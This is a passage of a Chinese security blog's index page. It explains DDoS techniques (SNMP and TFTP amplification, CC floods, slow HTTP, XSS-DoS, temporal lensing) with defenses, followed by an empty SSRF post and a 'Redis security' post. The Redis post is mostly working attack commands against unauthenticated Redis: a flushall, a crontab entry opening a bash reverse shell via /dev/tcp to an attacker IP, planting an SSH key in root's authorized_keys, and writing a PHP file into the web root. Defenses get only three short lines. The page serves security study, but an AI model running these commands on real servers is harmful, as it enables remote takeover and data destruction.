<h3 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h3><p>SNMP(Simple Network Management Protocol，简单网络管理协议)，是目前网络中应用最为广泛的网络管理协议，它提供了一个管理框架来监控和维和互联网设备，它使用UDP161端口进行通信。攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。常见的默认通信字符串如public、private以及一些厂商默认的通信字符串。GetBulk请求是在SNMPv2中添加的的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点。下面来看一下SNMP的PDU格式<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125522-21fc5cf4-f430-1.png" alt=""><br>攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。看一下SNMP的攻击图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125523-22a001d8-f430-1.png" alt=""></p>
<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p>禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；更改默认的通信字符串；修改默认端口161；隐藏开启SNMP设备的公网IP</p>
<h3 id="TFTP放大攻击"><a href="#TFTP放大攻击" class="headerlink" title="TFTP放大攻击"></a>TFTP放大攻击</h3><p>TFTP（Trivial File Transfer Protocol，简单文件传输协议），使用UDP 69端口进行通信，由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文，以下是TFTP传输文件过程图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125524-230a5b46-f430-1.png" alt=""><br>超时重传机制<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125525-238c2cd4-f430-1.png" alt=""><br>可以看到，TFTP协议将数据分成好多个数据块进行传输，每个数据块最大为512字节，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。若服务器没有收到客户端发来ACK报文，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了。来看一下TFTP放大攻击示意图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125525-23f22070-f430-1.png" alt=""></p>
<h4 id="防御方案："><a href="#防御方案：" class="headerlink" title="防御方案："></a>防御方案：</h4><p>不要将TFTP服务器暴露在公网上；对流经TFTP服务的流量进行入侵检测；将重传（数据包）率设置为1；只为信任域内的主机提供服务。</p>
<h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><p>CC攻击（ChallengeCollapsar）又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。这种攻击方式不需要很大的带宽，且无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接，因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125526-245d6a38-f430-1.png" alt=""></p>
<h4 id="防御方案-3"><a href="#防御方案-3" class="headerlink" title="防御方案"></a>防御方案</h4><p>必要时将网页做成静态，减少数据库的使用；限制连接数量；修改最大超时时间；让用户手动输入验证码；在response报文中添加特殊字段，验证IP合法性；屏蔽频繁访问服务器的主机IP。</p>
<h3 id="HTTP慢速攻击"><a href="#HTTP慢速攻击" class="headerlink" title="HTTP慢速攻击"></a>HTTP慢速攻击</h3><p>Slow HTTP Dos AttACKs（慢速HTTP拒绝服务攻击），黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。这种攻击可以分为两类，一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。HTTP慢速攻击还可以细分成以下几种攻击方式.</p>
<p>Slowloris攻击方式<br>HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而使用非正常的\r\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（Carriage Return Line Feed）表示回车换行<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125526-24b6ef9a-f430-1.png" alt=""></p>
<p>Slow post攻击方式<br>在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTP BODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125527-25298280-f430-1.png" alt=""></p>
<p>Slow read攻击方式<br>攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125528-25b7719e-f430-1.png" alt=""></p>
<p>Apache range header攻击<br>这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。<br>上面这4种攻击方式，也可以参考：CC攻击。了解了攻击原理，我们就可以有针对性地进行防御，</p>
<h4 id="这里说一下apache的防护策略"><a href="#这里说一下apache的防护策略" class="headerlink" title="这里说一下apache的防护策略"></a>这里说一下apache的防护策略</h4><p>设置并使用以下模块<br>mod_reqtimeout模块，控制请求数据传输的超时时间及最小速率，防护配置如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125529-2602e5b6-f430-1.png" alt=""><br>mod_qos模块，Apache的一个服务质量控制模块，用户可配置各种不同阈值，防护配置如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125529-266e6714-f430-1.png" alt=""><br>mod_security模块，一个开源的WAF模块，有专门针对慢速攻击防护的规则，防护配置如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125530-26c3e5ae-f430-1.png" alt=""><br>以上是针对Apache的一些防护策略，至于其他中间件的防护，可以参考这篇文章：<a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" target="_blank" rel="noopener">How to Protect Against Slow HTTP AttACKs</a></p>
<h3 id="XSS-DOS"><a href="#XSS-DOS" class="headerlink" title="XSS-DOS"></a>XSS-DOS</h3><p>利用网站存在的存储型XXS漏洞，在网站中插入恶意的javascript代码。代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求。客户端访问已插入恶意的javascript代码的页面后，抓包截图如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125531-275a46ac-f430-1.png" alt=""><br>由于这种攻击的是由存储型XSS导致的，我们再防御方面就要考虑如何防御存储型XSS。</p>
<h4 id="防御策略如下"><a href="#防御策略如下" class="headerlink" title="防御策略如下"></a>防御策略如下</h4><p>对用户的输入以及url参数进行特殊字符过滤；对输出内容进行编码转换；结合黑白名单机制。</p>
<h3 id="时间透镜攻击"><a href="#时间透镜攻击" class="headerlink" title="时间透镜攻击"></a>时间透镜攻击</h3><p>通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。<br>详细信息可以阅读这篇paper：<a href="http://icir.org/vern/papers/lensing.oak15.pdf" target="_blank" rel="noopener">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>或者这个<a href="https://www.youtube.com/watch?v=QwAHNnKDVxQ" target="_blank" rel="noopener">Youtube Video</a>,还有这份中文分析：<a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&amp;mid=2247483685&amp;idx=1&amp;sn=8ac38ff22d571bbbf7716cb9e83b9b35&amp;chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&amp;mpshare=1&amp;scene=23&amp;srcid=0831Wr5YJPYzSrQU6gnfGVd0" target="_blank" rel="noopener">时间透镜及其在脉冲拒绝服务攻击的应用</a></p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125532-282a2c96-f430-1.png" alt=""></p>
<h4 id="防御方案-4"><a href="#防御方案-4" class="headerlink" title="防御方案"></a>防御方案</h4><p>增加抖动，干扰攻击路径，使得数据包无法预期到达；由运营商禁止源路由。<br>其他防御措施：<br>采用高性能的网络设备；充足的网络带宽保证；升级主机服务器硬件；避免将服务器的真实IP暴露在公网中；使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的。然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用anycast技术来防御。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>参考<a href="https://xz.aliyun.com/t/70" target="_blank" rel="noopener">这篇文章</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/71" target="_blank" rel="noopener">https://xz.aliyun.com/t/71</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/04/18/ssrf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/ssrf/" class="post-title-link" itemprop="url">ssrf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-18 14:47:33" itemprop="dateCreated datePublished" datetime="2019-04-18T14:47:33+08:00">2019-04-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/04/18/redis-sec/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/redis-sec/" class="post-title-link" itemprop="url">redis安全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-04-18 14:09:38 / 修改时间：14:38:17" itemprop="dateCreated datePublished" datetime="2019-04-18T14:09:38+08:00">2019-04-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><code>redis-cli -h xx.xx.xx.xx</code></p>
<h2 id="一键获取root权限"><a href="#一键获取root权限" class="headerlink" title="一键获取root权限"></a>一键获取root权限</h2><p><code>192.168.63.130:6379&gt;flushall</code></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.63.128&#x2F;7999 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<h3 id="写ssh-keygen公钥然后使用私钥登陆"><a href="#写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="写ssh-keygen公钥然后使用私钥登陆"></a>写ssh-keygen公钥然后使用私钥登陆</h3><p>条件:<br>Redis服务使用ROOT账号启动<br>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2&#x2F;XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv&#x2F;RE&#x2F;eHYgoav&#x2F;k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG&#x2F;d4TwrIj1sRz4&#x2F;GeiWG6BZ8uQND9G+Vqbx&#x2F;+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b&#x2F;ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX&#x2F;GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<h3 id="往web物理路径写webshell"><a href="#往web物理路径写webshell" class="headerlink" title="往web物理路径写webshell"></a>往web物理路径写webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.63.130:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.63.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>限制登录ip<br>添加密码<br>修改默认端口</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">j1nse</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">j1nse</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
